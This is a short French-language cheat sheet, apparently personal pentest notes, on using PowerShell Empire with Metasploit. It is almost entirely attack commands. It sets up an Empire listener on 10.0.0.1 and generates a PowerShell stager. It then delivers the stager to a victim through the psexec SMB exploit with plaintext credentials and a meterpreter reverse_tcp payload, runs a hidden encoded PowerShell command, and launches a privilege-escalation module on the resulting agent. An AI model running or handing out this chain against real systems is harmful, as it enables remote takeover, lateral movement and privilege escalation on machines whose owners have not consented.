## empire

[http://www.powershellempire.com/](http://www.powershellempire.com/)

Lancer un listener dans empire :

```
cd ~/tools/empire/
./empire
listeners
list
info
set Name oreille
set Host http://10.0.0.1:8081/
run
```

Générer un stager (ici une commande powershell) :

```
main
usestager launcher
info
set Listener oreille
generate
```

Lancer le stager grâce à un `ps_exec` dans metasploit :

```
sudo msfconsole
use exploit/windows/smb/psexec
set rhost <ip_victime>
set smbdomain DOMEIN
set smbuser utilisateur
set smbpass secretPassword
set payload windows/meterpreter/reverse_tcp
set lport 8082
set lhost 10.0.0.1
exploit -j -z

 dans le meterpreter de la session ouverte
execute -f powershell.exe -a '-NoP -sta -NonI -W Hidden -Enc JAB3[…]A=='
```

Un agent devrait être né du listener. Il est possible de lancer un module :

```
[+] Initial agent K1AZ333ZLYTK3TTD from <ip_victime> now active

usemodule privesc/powerup/allchecks
options
info
set Agent K1AZ333ZLYTK3TTD
run
```

Attention : l'affichage du résultat du module lancé ne se fait pas dans la fenêtre.
Il faut aller voir `~/tools/empire/downloads/agents/K1AZ333ZLYTK3TTD/agent.log`



